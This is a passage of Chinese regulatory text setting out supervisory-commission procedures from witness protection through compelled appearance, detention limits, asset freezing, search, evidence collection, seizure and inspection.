证人或者其他任何人不得帮助被调查人伪造、隐匿、毁灭证据或者串供，不得实施其他干扰调查活动的行为。</p><p>  第九十七条  证人、鉴定人、被害人因作证，本人或者近亲属人身安全面临危险，向监察机关请求保护的，监察机关应当受理并及时进行审查；对于确实存在人身安全危险的，监察机关应当采取必要的保护措施。监察机关发现存在上述情形的，应当主动采取保护措施。 </p><p>  监察机关可以采取下列一项或者多项保护措施：</p><p>  （一）不公开真实姓名、住址和工作单位等个人信息；</p><p>  （二）禁止特定的人员接触证人、鉴定人、被害人及其近亲属；</p><p>  （三）对人身和住宅采取专门性保护措施；</p><p>  （四）其他必要的保护措施。</p><p>  依法决定不公开证人、鉴定人、被害人的真实姓名、住址和工作单位等个人信息的，可以在询问笔录等法律文书、证据材料中使用化名。但是应当另行书面说明使用化名的情况并标明密级，单独成卷。</p><p>  监察机关采取保护措施需要协助的，可以提请公安机关等有关单位和要求有关个人依法予以协助。</p><p>  第九十八条  本条例第八十三条至第八十六条的要求，也适用于询问。询问重要涉案人员，根据情况适用本条例第八十二条的规定。</p><p>  询问被害人，适用询问证人的规定。</p><p>  <strong>第六节  强制到案</strong></p><p>  第九十九条  监察机关调查严重职务违法或者职务犯罪，对于经通知无正当理由不到案的被调查人，经依法审批，可以强制其到监察机关谈话场所或者留置场所接受调查。</p><p>  首次通知到案一般应当以书面方式，确因情况紧急无法书面通知的，可以通过电话等方式通知，并将相关情况制作工作记录。</p><p>  采取强制到案措施时，调查人员不得少于二人，应当向被强制到案人员出具《强制到案决定书》。</p><p>  第一百条  监察机关应当立即将被强制到案人员送至监察机关谈话场所或者留置场所。强制到案的时间自被强制到案人员到达相关场所时起算。</p><p>  被强制到案人员到案后，应当要求其在《强制到案决定书》上填写到案时间，并签名、捺指印；强制到案结束后，应当要求被强制到案人员在《强制到案决定书》上填写结束时间，并签名、捺指印。被强制到案人员拒绝填写或者签名、捺指印的，调查人员应当在文书上记明。</p><p>  一次强制到案持续的时间不得超过十二小时；依法需要采取管护或者留置措施的，按规定报批后，强制到案持续的时间不得超过二十四小时。两次强制到案间隔的时间不得少于二十四小时，不得以连续强制到案的方式变相拘禁被调查人。两次强制到案的间隔时间从第一次强制到案结束时起算。</p><p>  第一百零一条  监察机关强制被调查人到案后，应当对涉嫌职务违法的被调查人及时谈话，对涉嫌职务犯罪的被调查人及时讯问。</p><p>  第一百零二条  监察机关在强制到案期限内未作出采取其他监察强制措施决定的，强制到案期满，应当立即结束强制到案。</p><p>  <strong>第七节  责令候查</strong></p><p>  第一百零三条  监察机关调查严重职务违法或者职务犯罪，对于符合监察法第二十三条第一款规定的，经依法审批，可以对被调查人采取责令候查措施。</p><p>  第一百零四条  采取责令候查措施时，调查人员不得少于二人，应当向被责令候查人员宣布《责令候查决定书》，出示《被责令候查人员权利义务告知书》，由被责令候查人员签名、捺指印，要求其遵守监察法第二十三条第二款的规定，告知其违反规定应负的法律责任。被责令候查人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  监察机关将其他监察强制措施变更为责令候查措施的，应当按照前款规定履行权利义务告知程序。</p><p>  责令候查最长不得超过十二个月，自向被责令候查人员宣布之日起算。</p><p>  第一百零五条  除无法通知的以外，监察机关应当在采取责令候查措施后二十四小时以内，通知被责令候查人员所在单位和家属。当面通知的，由有关人员在《责令候查通知书》上签名。无法当面通知的，可以先以电话等方式通知，并通过邮寄、转交等方式送达《责令候查通知书》，要求有关人员在《责令候查通知书》上签名。有关人员拒绝签名的，调查人员应当在文书上记明。</p><p>  第一百零六条  责令候查应当由决定采取责令候查措施的监察机关执行。</p><p>  执行责令候查的监察机关应当履行下列职责：</p><p>  （一）监督、考察被责令候查人员遵守有关规定，及时掌握其活动、住址、工作单位、联系方式及变动情况；</p><p>  （二）审批被责令候查人员离开所居住的直辖市、设区的市的城市市区或者不设区的市、县的辖区（以下统称所居住的市、县）的申请；</p><p>  （三）被责令候查人员违反应当遵守的规定的，及时制止或者纠正；</p><p>  （四）会同被责令候查人员所在单位、家属等对被责令候查人员开展思想教育、心理疏导工作。</p><p>  第一百零七条  被责令候查人员未经批准不得离开所居住的市、县。确有正当理由需要离开的，应当经决定采取责令候查措施的监察机关批准。</p><p>  在同一直辖市、设区的市内跨区活动的，不属于离开所居住的市、县。</p><p>  本条第一款所称正当理由，是指就医、就学、参与诉讼、往返居住地与工作地、处理重要家庭事务或者参加重要公务、商务活动等。</p><p>  第一百零八条  被责令候查人员需要离开所居住的市、县的，应当向监察机关提出书面申请，并注明事由、目的地、路线、交通方式、往返日期、联系方式等。监察机关应当自收到书面申请之日起三日以内作出决定。被责令候查人员有紧急事由，无法及时提出书面申请的，可以先行通过电话等方式提出申请，并及时补办书面申请手续。</p><p>  监察机关批准被责令候查人员离开所居住的市、县的申请后，应当告知其遵守下列要求：</p><p>  （一）保持联系方式畅通，并在接到通知后及时到案接受调查；</p><p>  （二）严格按照批准的地点、路线、往返日期出行；</p><p>  （三）不得从事妨碍调查的活动；</p><p>  （四）返回居住地后及时向执行机关报告。</p><p>  对于被责令候查人员因正常工作或者生活需要经常性离开所居住的市、县的，可以根据情况简化批准程序，一次性审批其在特定期间内按照批准的地点、路线出行。</p><p>  第一百零九条  被责令候查人员具有下列情形之一的，可以认定为监察法第二十三条第三款所规定的违反责令候查规定，情节严重：</p><p>  （一）企图逃跑、自杀的；</p><p>  （二）实施伪造、隐匿、毁灭证据或者串供、干扰证人作证行为，严重影响调查工作正常进行的；</p><p>  （三）对举报人、控告人、被害人、证人、鉴定人等相关人员实施打击报复的；</p><p>  （四）未经批准，擅自离开所居住的市、县，严重影响调查工作正常进行，或者两次未经批准，擅自离开所居住的市、县的；</p><p>  （五）经通知无正当理由不到案，严重影响调查工作正常进行，或者两次经通知无正当理由不到案的；</p><p>  （六）住址、工作单位和联系方式等发生变动，未按规定向监察机关报告，导致无法通知到案，严重影响调查工作正常进行的。</p><p>  依照监察法第二十三条第一款第三项规定被责令候查的人员，违反责令候查规定，情节严重，依法应予留置的，省级监察机关应当报请国家监察委员会批准，设区的市级以下监察机关应当逐级报送省级监察机关批准。</p><p>  第一百一十条  被管护人员、被留置人员、被禁闭人员及其近亲属向监察机关申请变更为责令候查措施的，应当以书面方式提出。监察机关收到申请后，应当在三日以内作出决定。经审查，符合责令候查条件的，可以将管护、留置或者禁闭措施依法变更为责令候查措施；不符合责令候查条件的，应当告知申请人，并说明不同意的理由。</p><p>  第一百一十一条  对被责令候查人员不需要继续采取责令候查措施或者责令候查期满的，应当按规定报批后解除责令候查措施。调查人员应当向被责令候查人员宣布《解除责令候查决定书》，由其签名、捺指印。被责令候查人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  解除责令候查措施的，应当及时通知被责令候查人员所在单位和家属。当面通知的，由有关人员在《解除责令候查通知书》上签名。无法当面通知的，可以先以电话等方式通知，并通过邮寄、转交等方式送达《解除责令候查通知书》，要求有关人员在《解除责令候查通知书》上签名。有关人员拒绝签名的，调查人员应当在文书上记明。</p><p>  第一百一十二条  案件依法移送人民检察院审查起诉的，责令候查措施自移送之日自动解除，不再办理解除法律手续。</p><p>  <strong>第八节  管    护</strong></p><p>  第一百一十三条  监察机关对于符合监察法第二十五条第一款规定的未被留置人员，经依法审批，可以对其采取管护措施。</p><p>  第一百一十四条  采取管护措施时，调查人员不得少于二人，应当向被管护人员宣布《管护决定书》，告知被管护人员权利义务，要求其在《管护决定书》上签名、捺指印。被管护人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  第一百一十五条  采取管护措施后，应当立即将被管护人员送留置场所，至迟不得超过二十四小时。</p><p>  第一百一十六条  采取管护措施后，应当在二十四小时以内通知被管护人员所在单位和家属。当面通知的，由有关人员在《管护通知书》上签名。无法当面通知的，可以先以电话等方式通知，并通过邮寄、转交等方式送达《管护通知书》，要求有关人员在《管护通知书》上签名。有关人员拒绝签名的，调查人员应当在文书上记明。</p><p>  因可能伪造、隐匿、毁灭证据，干扰证人作证或者串供等有碍调查情形而不宜通知的，应当按规定报批，记录在案。有碍调查的情形消失后，应当立即通知被管护人员所在单位和家属。</p><p>  第一百一十七条  监察机关采取管护措施后，应当在二十四小时以内对被管护人员进行谈话、讯问。</p><p>  第一百一十八条  管护时间不得超过七日，自向被管护人员宣布之日起算。因案情复杂、疑难，在七日以内无法作出留置或者解除管护决定的，经审批可以延长一日至三日。</p><p>  延长管护时间的，应当在管护期满前向被管护人员宣布延长管护时间的决定，要求其在《延长管护时间决定书》上签名、捺指印。被管护人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  延长管护时间的，应当及时通知被管护人员所在单位和家属。</p><p>  第一百一十九条  对被管护人员不需要继续采取管护措施的，应当按规定报批后解除管护或者变更为责令候查措施。管护期满的，应当按规定报批后予以解除。</p><p>  解除管护措施的，调查人员应当向被管护人员宣布解除管护措施的决定，由其在《解除管护决定书》上签名、捺指印；变更为责令候查措施的，应当向被管护人员宣布变更为责令候查措施的决定，由其在《变更管护决定书》上签名、捺指印。被管护人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  解除管护措施或者变更为责令候查措施的，应当及时通知被管护人员所在单位和家属、申请人。调查人员应当与交接人办理交接手续，并由其在《解除管护通知书》或者《变更管护通知书》上签名。无法通知或者有关人员拒绝签名的，调查人员应当在文书上记明。不得因办理交接手续延迟解除或者变更管护措施。</p><p>  第一百二十条  在管护期满前，将管护措施变更为留置措施的，按照本条例关于采取留置措施的规定执行。</p><p>  <strong>第九节  留    置</strong></p><p>  第一百二十一条  监察机关调查严重职务违法或者职务犯罪，对于符合监察法第二十四条第一款规定的，经依法审批，可以对被调查人采取留置措施。</p><p>  监察法第二十四条第一款规定的已经掌握其部分违法犯罪事实及证据，是指同时具备下列情形：</p><p>  （一）有证据证明发生了违法犯罪事实；</p><p>  （二）有证据证明该违法犯罪事实是被调查人实施；</p><p>  （三）证明被调查人实施违法犯罪行为的证据已经查证属实。</p><p>  部分违法犯罪事实，既可以是单一违法犯罪行为的事实，也可以是数个违法犯罪行为中任何一个违法犯罪行为的事实。</p><p>  监察法第二十四条第一款规定的重要问题，是指对被调查人涉嫌的严重职务违法或者职务犯罪，在定性处置、定罪量刑等方面有重要影响的事实、情节及证据。</p><p>  第一百二十二条  被调查人具有下列情形之一的，可以认定为监察法第二十四条第一款第二项所规定的可能逃跑、自杀：</p><p>  （一）着手准备自杀、自残或者逃跑的；</p><p>  （二）曾经有自杀、自残或者逃跑行为的；</p><p>  （三）有自杀、自残或者逃跑意图的；</p><p>  （四）其他可能逃跑、自杀的情形。</p><p>  第一百二十三条  被调查人具有下列情形之一的，可以认定为监察法第二十四条第一款第三项所规定的可能串供或者伪造、隐匿、毁灭证据：</p><p>  （一）曾经或者企图串供，伪造、隐匿、毁灭、转移证据的；</p><p>  （二）曾经或者企图威逼、恐吓、利诱、收买证人，干扰证人作证的；</p><p>  （三）有同案人或者与被调查人存在密切关联违法犯罪的涉案人员在逃，重要证据尚未收集完成的；</p><p>  （四）其他可能串供或者伪造、隐匿、毁灭证据的情形。</p><p>  第一百二十四条  被调查人具有下列情形之一的，可以认定为监察法第二十四条第一款第四项所规定的可能有其他妨碍调查行为：</p><p>  （一）可能继续实施违法犯罪行为的；</p><p>  （二）有危害国家安全、公共安全等现实危险的；</p><p>  （三）可能对举报人、控告人、被害人、证人、鉴定人等相关人员实施打击报复的；</p><p>  （四）无正当理由拒不到案，严重影响调查的；</p><p>  （五）其他可能妨碍调查的行为。</p><p>  第一百二十五条  对下列人员不得采取留置措施：</p><p>  （一）患有严重疾病、生活不能自理的；</p><p>  （二）怀孕或者正在哺乳自己婴儿的妇女；</p><p>  （三）生活不能自理的人的唯一扶养人。</p><p>  上述情形消失后，根据调查需要可以对相关人员采取留置措施。</p><p>  第一百二十六条  采取留置措施时，调查人员不得少于二人，应当向被留置人员宣布《留置决定书》，告知被留置人员权利义务，要求其在《留置决定书》上签名、捺指印。被留置人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  第一百二十七条  采取留置措施后，应当在二十四小时以内通知被留置人员所在单位和家属。当面通知的，由有关人员在《留置通知书》上签名。无法当面通知的，可以先以电话等方式通知，并通过邮寄、转交等方式送达《留置通知书》，要求有关人员在《留置通知书》上签名。有关人员拒绝签名的，调查人员应当在文书上记明。</p><p>  因可能伪造、隐匿、毁灭证据，干扰证人作证或者串供等有碍调查情形而不宜通知的，应当按规定报批，记录在案。有碍调查的情形消失后，应当立即通知被留置人员所在单位和家属。</p><p>  第一百二十八条  监察机关采取留置措施后，应当在二十四小时以内对涉嫌职务违法的被调查人进行谈话，对涉嫌职务犯罪的被调查人进行讯问。</p><p>  第一百二十九条  留置时间不得超过三个月，自向被留置人员宣布之日起算。具有下列情形之一的，经审批可以延长一次，延长时间不得超过三个月：</p><p>  （一）案情重大，严重危害国家利益或者公共利益的；</p><p>  （二）案情复杂，涉案人员多、金额巨大，涉及范围广的；</p><p>  （三）重要证据尚未收集完成，或者重要涉案人员尚未到案，导致违法犯罪的主要事实仍须继续调查的；</p><p>  （四）其他需要延长留置时间的情形。</p><p>  省级以下监察机关采取留置措施的，延长留置时间应当报请上一级监察机关批准。</p><p>  延长留置时间的，应当在留置期满前向被留置人员宣布延长留置时间的决定，要求其在《延长留置时间决定书》上签名、捺指印。被留置人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  延长留置时间的，应当及时通知被留置人员所在单位和家属。</p><p>  第一百三十条  对涉嫌职务犯罪的被调查人可能判处十年有期徒刑以上刑罚，监察机关按照本条例第一百二十九条规定延长期限届满，仍不能调查终结的，经审批可以再延长，再延长时间不得超过二个月。  </p><p>  省级以下监察机关需要再延长留置时间的，应当逐级报送国家监察委员会批准。</p><p>  再延长留置时间的，应当在留置期满前向被留置人员宣布再延长留置时间的决定，要求其在《再延长留置时间决定书》上签名、捺指印。被留置人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  再延长留置时间的，应当及时通知被留置人员所在单位和家属。</p><p>  第一百三十一条  报请批准延长或者再延长留置时间，应当在报请材料中写明被留置人员基本情况、主要案情和留置后调查工作进展情况、下一步调查工作计划、延长或者再延长留置时间的具体理由及起止时间。</p><p>  报请批准延长或者再延长留置时间，应当根据案件具体情况和实际工作需要，提出合理、必要的时间建议。</p><p>  上级监察机关收到报请批准延长或者再延长留置时间的申请后，应当及时研究，在原留置期限届满前按程序作出决定。</p><p>  第一百三十二条  省级以上监察机关在调查期间，发现涉嫌职务犯罪的被调查人另有与留置时的罪行不同种的重大职务犯罪或者同种的影响罪名认定、量刑档次的重大职务犯罪，经审批可以依照监察法第四十八条第三款的规定重新计算留置时间。留置时间重新计算以一次为限。</p><p>  依照前款规定重新计算留置时间的，国家监察委员会调查部门应当自发现之日起五日以内履行报批程序，省级监察机关应当自发现之日起五日以内报请国家监察委员会批准。</p><p>  重新计算留置时间的，应当自作出决定之日起五日以内向被留置人员宣布，要求其在《重新计算留置时间决定书》上签名、捺指印，并及时通知被留置人员所在单位和家属。被留置人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  第一百三十三条  重新计算留置时间的，留置时间不得超过三个月。新发现的罪行具有本条例第一百二十九条、第一百三十条规定情形的，可以依法延长和再延长留置时间。但是，此前已经根据本条例第一百三十条规定再延长留置时间的，不得再次适用该规定再延长留置时间。</p><p>  第一百三十四条  对被留置人员不需要继续采取留置措施的，应当按规定报批后解除留置或者变更为责令候查措施。留置期满的，应当按规定报批后予以解除。</p><p>  解除留置措施的，调查人员应当向被留置人员宣布解除留置措施的决定，由其在《解除留置决定书》上签名、捺指印；变更为责令候查措施的，应当向被留置人员宣布变更为责令候查措施的决定，由其在《变更留置决定书》上签名、捺指印。被留置人员拒绝签名、捺指印的，调查人员应当在文书上记明。</p><p>  解除留置措施或者变更为责令候查措施的，应当及时通知被留置人员所在单位和家属、申请人。调查人员应当与交接人办理交接手续，并由其在《解除留置通知书》或者《变更留置通知书》上签名。无法通知或者有关人员拒绝签名的，调查人员应当在文书上记明。不得因办理交接手续延迟解除或者变更留置措施。</p><p>  案件依法移送人民检察院审查起诉的，留置措施自犯罪嫌疑人被执行拘留时自动解除，不再办理解除法律手续。</p><p>  <strong>第十节  查询、冻结</strong></p><p>  第一百三十五条  监察机关调查严重职务违法或者职务犯罪，根据工作需要，按规定报批后，可以依法查询、冻结涉案单位和个人的存款、汇款、债券、股票、基金份额等财产。</p><p>  第一百三十六条  查询、冻结财产时，调查人员不得少于二人。调查人员应当出具《协助查询财产通知书》或者《协助冻结财产通知书》，送交银行或者其他金融机构、邮政部门等单位执行。有关单位和个人应当予以配合，并严格保密。</p><p>  查询财产应当在《协助查询财产通知书》中填写查询账号、查询内容等信息。没有具体账号的，应当填写足以确定账户或者权利人的自然人姓名、身份证件号码或者市场主体名称、统一社会信用代码等信息。</p><p>  冻结财产应当在《协助冻结财产通知书》中填写冻结账户名称、冻结账号、冻结数额、冻结期限起止时间等信息。冻结数额应当具体、明确，暂时无法确定具体数额的，应当在《协助冻结财产通知书》上明确写明“只收不付”。冻结证券和交易结算资金时，应当明确冻结的范围是否及于孳息。</p><p>  冻结财产，应当为被调查人及其所扶养的亲属保留必需的生活费用。</p><p>  第一百三十七条  调查人员可以根据需要对查询结果进行打印、抄录、复制、拍照，要求相关单位在有关材料上加盖证明印章。对查询结果有疑问的，可以要求相关单位进行书面解释并加盖印章。</p><p>  第一百三十八条  监察机关对查询信息应当加强管理，规范信息交接、调阅、使用程序和手续，防止滥用和泄露。</p><p>  调查人员不得查询与案件调查工作无关的信息。</p><p>  第一百三十九条  冻结财产的期限不得超过六个月。冻结期限到期未办理续冻手续的，冻结自动解除。</p><p>  有特殊原因需要延长冻结期限的，应当在到期前按原程序报批，办理续冻手续。每次续冻期限不得超过六个月。</p><p>  第一百四十条  已被冻结的财产可以轮候冻结，不得重复冻结。轮候冻结的，监察机关应当要求有关银行或者其他金融机构等单位在解除冻结或者作出处理前予以通知。</p><p>  监察机关接受司法机关、其他监察机关等国家机关移送的涉案财物后，该国家机关采取的冻结期限届满，监察机关续行冻结的顺位与该国家机关冻结的顺位相同。</p><p>  第一百四十一条  冻结财产应当通知权利人或者其法定代理人、委托代理人，要求其在《冻结财产告知书》上签名。冻结股票、债券、基金份额等财产，应当告知权利人或者其法定代理人、委托代理人有权申请出售。</p><p>  对于被冻结的股票、债券、基金份额等财产，权利人或者其法定代理人、委托代理人申请出售，不损害国家利益、被害人利益，不影响调查正常进行的，经审批可以在案件办结前由相关机构依法出售或者变现。对于被冻结的汇票、本票、支票即将到期的，经审批可以在案件办结前由相关机构依法出售或者变现。出售上述财产的，应当出具《许可出售冻结财产通知书》。</p><p>  出售或者变现所得价款应当继续冻结在其对应的银行账户中；没有对应的银行账户的，应当存入监察机关指定的专用账户保管，并将存款凭证送监察机关登记。监察机关应当及时向权利人或者其法定代理人、委托代理人出具《出售冻结财产通知书》，并要求其签名。拒绝签名的，调查人员应当在文书上记明。</p><p>  第一百四十二条  对于冻结的财产，应当及时核查。经查明与案件无关的，经审批，应当在查明后三日以内将《解除冻结财产通知书》送交有关单位执行。解除情况应当告知被冻结财产的权利人或者其法定代理人、委托代理人。</p><p>  <strong>第十一节  搜    查</strong></p><p>  第一百四十三条  监察机关调查职务犯罪案件，为了收集犯罪证据、查获被调查人，按规定报批后，可以依法对被调查人以及可能隐藏被调查人或者犯罪证据的人的身体、物品、住处、工作地点和其他有关地方进行搜查。</p><p>  第一百四十四条  搜查应当在调查人员主持下进行，调查人员不得少于二人。搜查女性的身体，由女性工作人员进行。</p><p>  搜查时，应当有被搜查人或者其家属、其所在单位工作人员或者其他见证人在场。调查人员应当向被搜查人或者其家属、见证人出示《搜查证》，要求其签名或者盖章。被搜查人或者其家属不在场，或者拒绝签名、盖章的，调查人员应当在文书上记明。</p><p>  第一百四十五条  搜查时，应当要求在场人员予以配合，不得进行阻碍。对以暴力、威胁等方法阻碍搜查的，应当依法制止。对阻碍搜查构成违法犯罪的，依法追究法律责任。</p><p>  第一百四十六条  对搜查取证工作，应当全程同步录音录像。</p><p>  对搜查情况应当制作《搜查笔录》，由调查人员和被搜查人或者其家属、见证人签名或者盖章。被搜查人或者其家属不在场，或者拒绝签名、盖章的，调查人员应当在笔录中记明。</p><p>  对于查获的重要物证、书证、视听资料、电子数据及其放置、存储位置应当拍照，并在《搜查笔录》中作出文字说明。</p><p>  第一百四十七条  搜查时，应当避免未成年人或者其他不适宜在搜查现场的人在场。</p><p>  搜查人员应当服从指挥、文明执法，不得擅自变更搜查对象和扩大搜查范围，严禁单独进入搜查区域。搜查的具体时间、方法，在实施前应当严格保密。</p><p>  第一百四十八条  在搜查过程中查封、扣押财物和文件的，按照查封、扣押的有关规定办理。</p><p>  <strong>第十二节  调    取</strong></p><p>  第一百四十九条  监察机关按规定报批后，可以依法向有关单位和个人调取用以证明案件事实的证据材料。</p><p>  第一百五十条  调取证据材料时，调查人员不得少于二人。调查人员应当依法出具《调取证据通知书》，必要时附《调取证据清单》。</p><p>  有关单位和个人配合监察机关调取证据，应当严格保密。</p><p>  第一百五十一条  调取物证应当调取原物。原物不便搬运、保存，或者依法应当返还，或者因保密工作需要不能调取原物的，可以将原物封存，并拍照、录像。对原物拍照或者录像时，应当足以反映原物的外形、内容。</p><p>  调取书证、视听资料应当调取原件。取得原件确有困难或者因保密工作需要不能调取原件的，可以调取副本或者复制件。</p><p>  调取物证的照片、录像和书证、视听资料的副本、复制件的，应当书面记明不能调取原物、原件的原因，原物、原件存放地点，制作过程，是否与原物、原件相符，并由调查人员和物证、书证、视听资料原持有人签名或者盖章。持有人无法签名、盖章或者拒绝签名、盖章的，应当在笔录中记明，由见证人签名。</p><p>  第一百五十二条  调取外文材料作为证据使用的，应当交由具有资质的机构和人员出具中文译本。中文译本应当加盖翻译机构公章。</p><p>  第一百五十三条  收集、提取电子数据，能够扣押原始存储介质的，应当予以扣押、封存并在笔录中记录封存状态。无法扣押原始存储介质的，可以采取调取、勘验检查措施，通过现场或者网络远程收集、提取电子数据，但应当在笔录中记明不能扣押的原因、原始存储介质的存放地点或者电子数据的来源等情况。</p><p>  由于客观原因无法或者不宜采取前款规定方式收集、提取电子数据的，可以采取打印、拍照或者录像等方式固定相关证据，并在笔录中说明原因。</p><p>  收集、提取的电子数据，足以保证完整性，无删除、修改、增加等情形的，可以作为证据使用。</p><p>  收集、提取电子数据，应当制作笔录，记录案由、对象、内容，收集、提取电子数据的时间、地点、方法、过程，并附电子数据清单，注明类别、文件格式、完整性校验值等，由调查人员、电子数据持有人（提供人）签名或者盖章；电子数据持有人（提供人）无法签名或者拒绝签名的，应当在笔录中记明，由见证人签名或者盖章。有条件的，应当对相关活动进行录像。</p><p>  第一百五十四条  调取的物证、书证、视听资料等原件，经查明与案件无关的，经审批，应当在查明后三日以内退还，并办理交接手续。</p><p>  <strong>第十三节  查封、扣押</strong></p><p>  第一百五十五条  监察机关按规定报批后，可以依法查封、扣押用以证明被调查人涉嫌违法犯罪以及情节轻重的财物、文件、电子数据等证据材料。</p><p>  对于被调查人到案时随身携带的物品，以及被调查人或者其他相关人员主动上交的财物和文件，依法需要扣押的，依照前款规定办理。对于被调查人随身携带的与案件无关的个人用品，应当逐件登记，随案移交或者退还。</p><p>  第一百五十六条  对查封、扣押工作，应当全程同步录音录像。</p><p>  查封、扣押时，应当出具《查封/扣押通知书》，调查人员不得少于二人。持有人拒绝交出应当查封、扣押的财物和文件的，可以依法强制查封、扣押。</p><p>  调查人员对于查封、扣押的财物和文件，应当会同在场见证人和被查封、扣押财物持有人进行清点核对，开列《查封/扣押财物、文件清单》，由调查人员、见证人和持有人签名或者盖章。持有人不在场或者拒绝签名、盖章的，调查人员应当在清单上记明。</p><p>  查封、扣押财物，应当为被调查人及其所扶养的亲属保留必需的生活费用和物品。</p><p>  第一百五十七条  查封、扣押不动产和置于该不动产上不宜移动的设施、家具和其他相关财物，以及车辆、船舶、航空器和大型机械、设备等财物，必要时可以依法扣押其权利证书，经拍照或者录像后原地封存。调查人员应当在查封清单上记明相关财物的所在地址和特征，已经拍照或者录像及其权利证书被扣押的情况，由调查人员、见证人和持有人签名或者盖章。持有人不在场或者拒绝签名、盖章的，调查人员应当在清单上记明。</p><p>  查封、扣押前款规定财物的，必要时可以将被查封财物交给持有人或者其近亲属保管。调查人员应当告知保管人妥善保管，不得对被查封财物进行转移、变卖、毁损、抵押、赠予等处理。</p><p>  调查人员应当将《查封/扣押通知书》送达不动产、生产设备或者车辆、船舶、航空器等财物的登记、管理部门，告知其在查封期间禁止办理抵押、转让、出售等权属关系变更、转移登记手续。相关情况应当在查封清单上记明。被查封、扣押的财物已经办理抵押登记的，监察机关在执行没收、追缴、责令退赔等决定时应当及时通知抵押权人。</p><p>  第一百五十八条  查封、扣押下列物品，应当依法进行相应的处理：</p><p>  （一）查封、扣押外币、金银珠宝、文物、名贵字画以及其他不易辨别真伪的贵重物品，具备当场密封条件的，应当当场密封，由二名以上调查人员在密封材料上签名并记明密封时间。不具备当场密封条件的，应当在笔录中记明，以拍照、录像等方法加以保全后进行封存。查封、扣押的贵重物品需要鉴定的，应当及时鉴定。</p><p>  （二）查封、扣押存折、银行卡、有价证券等支付凭证和具有一定特征能够证明案情的现金，应当记明特征、编号、种类、面值、张数、金额等，当场密封，由二名以上调查人员在密封材料上签名并记明密封时间。</p><p>  （三）查封、扣押易损毁、灭失、变质等不宜长期保存的物品以及有消费期限的卡、券，应当在笔录中记明，以拍照、录像等方法加以保全后进行封存，或者经审批委托有关机构变卖、拍卖。变卖、拍卖的价款存入专用账户保管，待调查终结后一并处理。</p><p>  （四）对于可以作为证据使用的录音录像、电子数据存储介质，应当记明案由、对象、内容，录制、复制的时间、地点、规格、类别、应用长度、文件格式及长度等，制作清单。具备查封、扣押条件的电子设备、存储介质应当密封保存。必要时，可以请有关机关协助。</p><p>  （五）对被调查人使用违法犯罪所得与合法收入共同购置的不可分割的财产，可以先行查封、扣押。对无法分割退还的财产，涉及违法的，可以经被调查人申请并经监察机关批准，由被调查人亲属或者被调查人委托的其他人员在监察机关监督下自行变现后上缴违法所得及孳息，也可以由监察机关在结案后委托有关单位拍卖、变卖，退还不属于违法所得的部分及孳息；涉及职务犯罪的，依法移送司法机关处置，并说明涉嫌犯罪所得及孳息数额。</p><p>  （六）查封、扣押危险品、违禁品，应当及时送交有关部门，或者根据工作需要严格封存保管。</p><p>  第一百五十九条  对于需要启封的财物和文件，应当由二名以上调查人员共同办理。重新密封时，由二名以上调查人员在密封材料上签名、记明时间。</p><p>  第一百六十条  查封、扣押涉案财物，应当按规定将涉案财物详细信息、《查封/扣押财物、文件清单》录入并上传监察机关涉案财物信息管理系统。</p><p>  对于涉案款项，应当在采取措施后十五日以内存入监察机关指定的专用账户。对于涉案物品，应当在采取措施后三十日以内移交涉案财物保管部门保管。因特殊原因不能按时存入专用账户或者移交保管的，应当按规定报批，将保管情况录入涉案财物信息管理系统，在原因消除后及时存入或者移交。</p><p>  第一百六十一条  对于已移交涉案财物保管部门保管的涉案财物，根据调查工作需要，经审批可以临时调用，并应当确保完好。调用结束后，应当及时归还。调用和归还时，调查人员、保管人员应当当面清点查验。保管部门应当对调用和归还情况进行登记，全程录像并上传涉案财物信息管理系统。</p><p>  第一百六十二条  对于被扣押的股票、债券、基金份额等财产，以及即将到期的汇票、本票、支票，依法需要出售或者变现的，按照本条例关于出售冻结财产的规定办理。</p><p>  第一百六十三条  监察机关接受司法机关、其他监察机关等国家机关移送的涉案财物后，该国家机关采取的查封、扣押期限届满，监察机关续行查封、扣押的顺位与该国家机关查封、扣押的顺位相同。</p><p>  第一百六十四条  对查封、扣押的财物和文件，应当及时进行核查。经查明与案件无关的，经审批，应当在查明后三日以内解除查封、扣押，予以退还。解除查封、扣押的，应当向有关单位、原持有人或者近亲属送达《解除查封/扣押通知书》，附《解除查封/扣押财物、文件清单》，要求其签名或者盖章。</p><p>  第一百六十五条  在立案调查之前，对监察对象及相关人员主动上交的涉案财物，经审批可以接收。</p><p>  接收时，应当由二名以上调查人员，会同持有人和见证人进行清点核对，当场填写《主动上交财物登记表》。调查人员、持有人和见证人应当在登记表上签名或者盖章。</p><p>  对于主动上交的财物，应当根据立案及调查情况及时决定是否依法查封、扣押。</p><p>  <strong>第十四节  勘验检查、调查实验</strong></p><p>  第一百六十六条  监察机关按规定报批后，可以依法对与违法犯罪有关的场所、物品、人身、尸体、电子数据等进行勘验检查。</p><p>  第一百六十七条  依法需要勘验检查的，应当制作《勘验检查证》；需要委托勘验检查的，应当出具《委托勘验检查书》，送具有专门知识的人办理。</p><p>  第一百六十八条  勘验检查应当由二名以上调查人员主持，邀请与案件无关的见证人在场。勘验检查情况应当制作笔录，并由参加勘验检查人员和见证人签名或者盖章。</p><p>  勘验检查现场、拆封电子数据存储介质应当全程同步录音录像。对现场情况应当拍摄现场照片、制作现场图，并由勘验检查人员签名或者盖章。</p><p>  第一百六十九条  为了确定被调查人或者相关人员的某些特征、伤害情况或者生理状态，可以依法对其人身进行检查。必要时可以聘请法医或者医师进行人身检查。检查女性身体，应当由女性工作人员或者医师进行。被调查人拒绝检查的，可以依法强制检查。</p><p>  人身检查不得采用损害被检查人生命、健康或者贬低其名誉、人格的方法。对人身检查过程中知悉的个人隐私，应当严格保密。</p><p>  对人身检查的情况应当制作笔录，由参加检查的调查人员、检查人员、被检查人员和见证人签名或者盖章。被检查人员拒绝签名、盖章的，调查人员应当在笔录中记明。</p><p>  第一百七十条  为查明案情，在必要的时候，经审批可以依法进行调查实验。调查实验，可以聘请有关专业人员参加，也可以要求被调查人、被害人、证人参加。</p><p>  